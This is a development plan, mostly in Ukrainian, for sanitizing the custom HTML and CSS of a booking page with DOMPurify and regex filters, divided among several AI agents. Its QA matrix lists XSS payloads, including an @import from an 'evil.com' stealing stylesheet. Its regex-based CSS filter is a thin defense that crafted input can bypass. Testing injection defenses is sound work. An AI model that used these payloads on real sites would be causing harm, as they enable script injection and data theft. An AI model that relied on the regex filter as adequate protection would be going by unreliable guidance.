# BE.9 — DOMPurify для Custom HTML/CSS (FINAL v2)

> [[Home]] > Tasks | Owner: **AI 1 (Claude) + AI 2 (Codex)**
> Planner: AI 3 (Verdent) | Date: 2026-04-15 (REVISED per AI 1 + AI 2 review)
> Status: **PLAN APPROVED ✅ — READY FOR IMPLEMENTATION**
> Related: [[Tasks/3-AI-Remaining-Work-Split]], [[Tasks/QA-Scan-2026-04-15]]
> Review Gate: AI 1 ✅ | AI 2 ✅ | AI 4 ✅ | Owner ✅

---

## Зміни в цій версії (v2)

| Issue | Від кого | Виправлення |
|---|---|---|
| CSS parser decision | AI 1 | **Option A (regex) прийнято** — відомі патерни добре визначені, ризик прийнятний |
| jsdom → linkedom | AI 1 | Заміна на `linkedom` (~500KB vs ~20MB) для Cloud Run cold start |
| One-shot re-sanitization | AI 1 | Додано endpoint для існуючих даних |
| processCustomHTML order | AI 1 + AI 2 | Санітизація ПІСЛЯ placeholder expansion |
| All write sites | AI 1 | Перелік всіх 4 місць де пишеться `site_config` |
| XSS test matrix | AI 1 | 7 тест-кейсів для QA |
| HTML vs CSS separation | AI 2 | Чітке розділення: HTML→DOMPurify, CSS→regex (backend primary) |

---

## Архітектура: Defense-in-Depth

```
┌─────────────────────────────────────────────────────────────┐
│  LAYER 1 (Backend - Primary)                                │
│  Санітизація при ЗАПИСІ в Firestore                         │
│  • sanitizeCustomHtml() → DOMPurify + linkedom              │
│  • sanitizeCustomCss() → regex (expression, url(js), @import)│
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  LAYER 2 (Frontend - Secondary)                             │
│  Санітизація при РЕНДЕРИНГУ                                 │
│  • DOMPurify.sanitize() на всіх 3 dangerouslySetInnerHTML   │
│  • Ловить те що пройшло через Layer 1                       │
└─────────────────────────────────────────────────────────────┘
```

---

## Частина 1 — AI 1 (Backend)

### Залежності

```bash
npm install dompurify linkedom
```

### Helpers

```js
const { Window } = require('linkedom');
const createDOMPurify = require('dompurify');
const DOMPurify = createDOMPurify(new Window());

// CSS sanitization — Option A (regex-based, свідомий вибір)
// Justification: відомі небезпечні CSS патерни добре визначені.
// Ризик майбутніх parser quirks прийнятний vs вага css-tree.
function sanitizeCustomCss(css) {
  if (!css || typeof css !== 'string') return '';
  return css
    .replace(/expression\s*\(/gi, '')
    .replace(/url\s*\(\s*['"]?\s*javascript:/gi, 'url(')
    .replace(/@import\b/gi, '/* @import blocked */')
    .slice(0, 50000);
}

function sanitizeCustomHtml(html) {
  if (!html || typeof html !== 'string') return '';
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p','br','b','i','strong','em','u','h1','h2','h3','h4',
                   'ul','ol','li','a','img','div','span','section','hr','table',
                   'thead','tbody','tr','th','td','blockquote','pre','code'],
    ALLOWED_ATTR: ['href','src','alt','title','class','id','style','target'],
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ['script','object','embed','form','input','iframe'],
    FORBID_ATTR: ['onerror','onload','onclick','onmouseover','onfocus'],
  });
}
```

### Write Sites (всі місця де пишемо site_config)

| Endpoint | Файл | Санітизація |
|---|---|---|
| `POST /api/settings` | backend/index.js | ✅ Додати |
| Onboarding wizard | backend/index.js | ✅ Додати |
| AI Style generator | backend/index.js | ✅ Додати |
| Template application | backend/index.js | ✅ Додати |

### Код для кожного write site

```js
if (updates.site_config?.custom_html !== undefined) {
  updates.site_config.custom_html = sanitizeCustomHtml(updates.site_config.custom_html);
}
if (updates.site_config?.custom_css !== undefined) {
  updates.site_config.custom_css = sanitizeCustomCss(updates.site_config.custom_css);
}
if (updates.site_config?.ai_css !== undefined) {
  updates.site_config.ai_css = sanitizeCustomCss(updates.site_config.ai_css);
}
```

### One-shot Re-sanitization Endpoint

```
POST /api/vurium-dev/sanitize-existing-custom-content
```

Проходить по всім workspaces, ре-санітизує існуючі `custom_html`, `custom_css`, `ai_css`.

---

## Частина 2 — AI 2 (Frontend)

### Залежності

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### processCustomHTML Clarification

**ВАЖЛИВО:** Санітизація відбувається **ПІСЛЯ** placeholder expansion.

```tsx
// app/book/[id]/page.tsx ~line 161
function processCustomHTML(html: string, vars: TemplateVars): string {
  // 1. Спочатку expand placeholders (з escapeHtml для значень)
  let processed = html.replace(/\{\{shopName\}\}/g, escapeHtml(vars.shopName));
  // ... інші placeholders
  
  // 2. Потім sanitize результат
  return DOMPurify.sanitize(processed);
}
```

### Три місця рендерингу

```tsx
import DOMPurify from 'dompurify';

// 1. AI CSS (~line 937)
<style dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(siteConfig.ai_css || '') 
}} />

// 2. Custom CSS (~line 1082)
<style dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(siteConfig.custom_css || '') 
}} />

// 3. Custom HTML (~line 1087) — ПІСЛЯ processCustomHTML
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(processCustomHTML(siteConfig.custom_html, templateVars)) 
}} />
```

---

## XSS Test Matrix (QA checklist)

| # | Payload | Очікуваний результат | Статус |
|---|---|---|---|
| 1 | `<script>alert(1)</script>` | Stripped completely | ⏳ |
| 2 | `<img src=x onerror=alert(1)>` | `onerror` stripped, `img` kept | ⏳ |
| 3 | `<a href="javascript:alert(1)">` | `href` dropped or sanitized | ⏳ |
| 4 | `body { background: url(javascript:alert(1)) }` | `javascript:` replaced | ⏳ |
| 5 | `.x { x: expression(alert(1)) }` | `expression` stripped | ⏳ |
| 6 | `@import url(//evil.com/steal.css)` | Blocked/commented | ⏳ |
| 7 | `{{shopName}}` with `<script>` value | Stripped by DOMPurify | ⏳ |

---

## Scope Boundary

**В цьому плані:**
- ✅ Public booking page (`/book/[id]`)
- ✅ `custom_html`, `custom_css`, `ai_css` поля

**НЕ в цьому плані (окремі задачі):**
- ❌ Developer email page (`app/developer/email/[id]/page.tsx`)
- ❌ Інші `dangerouslySetInnerHTML` в адмінці

---

## Послідовність

1. **AI 1:** Backend + write sites + re-sanitization endpoint
2. **AI 1:** Commit → merge
3. **AI 2:** Frontend (після merge AI 1)
4. **AI 2:** Commit
5. **AI 3 (Verdent):** QA з XSS test matrix

---

## DoD

- [ ] `sanitizeCustomHtml()` та `sanitizeCustomCss()` в `backend/index.js`
- [ ] Всі 4 write sites санітизують при записі
- [ ] `linkedom` використано замість `jsdom`
- [ ] Re-sanitization endpoint працює
- [ ] AI 2: всі 3 `dangerouslySetInnerHTML` обгорнуті в DOMPurify
- [ ] AI 2: `processCustomHTML` санітизує після expansion
- [ ] Build без TypeScript помилок
- [ ] XSS test matrix: 7/7 passed
- [ ] Два commit-и: AI 1 → AI 2
- [ ] DevLog записи
